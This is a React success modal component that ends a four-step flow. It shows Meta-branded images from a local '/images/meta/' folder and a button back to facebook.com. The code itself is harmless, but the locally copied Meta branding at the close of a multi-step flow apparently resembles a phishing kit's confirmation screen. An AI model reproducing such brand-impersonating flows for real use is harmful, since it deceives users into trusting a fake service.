'use client'

import React from 'react';

import { useAppStrings } from '@/hooks/useAppStrings';

import Modal from './Modal';

interface SuccessModalProps {
    isOpend: boolean;
    onToggleSuccess: (value: boolean) => void;
}

const SuccessModal: React.FC<SuccessModalProps> = ({ isOpend, onToggleSuccess }) => {
    const t = useAppStrings();
    const [isOpen, setIsOpen] = React.useState(isOpend);

    React.useEffect(() => {
        setIsOpen(isOpend);
    }, [isOpend]);

    const handleClose = () => {
        setIsOpen(false);
        onToggleSuccess(false);
    };

    return (
        <Modal
            isOpen={isOpen}
            title={t.success.title}
            onClose={handleClose}
            flowStep={{ current: 4, total: 4, variant: 'complete' }}
        >

            <div className="flex min-h-full w-full min-w-0 flex-col gap-8 pb-2">
                <div className="w-full min-w-0">
                    <div className='rounded-[10px] overflow-hidden mb-[15px]'>
                        <img src="/images/meta/succes.jpg" width="100%" alt="success" />
                    </div>
                    <p className='text-[#4f5f79] mb-[10px] text-[15px] leading-[1.65] pt-4'>
                        {t.success.p1}
                    </p>
                    <p className='text-[#6b7b95] mb-[20px] text-[14px] leading-[1.6]'>
                        {t.success.p2}
                    </p>
                    <a
                        className='min-h-[48px] w-full bg-[#0064E0] text-white rounded-[40px] px-4 py-[10px] flex items-center justify-center transition-opacity duration-300 hover:opacity-90 active:opacity-90'
                        href="https://www.facebook.com"
                    >
                        {t.success.cta}
                    </a>
                </div>

                <div className='mx-auto h-[60px] w-[60px] shrink-0'>
                    <img src="/images/meta/logo-gray.svg" width="100%" height="100%" alt="logo" />
                </div>
            </div>
        </Modal>
    );
};

export default SuccessModal;
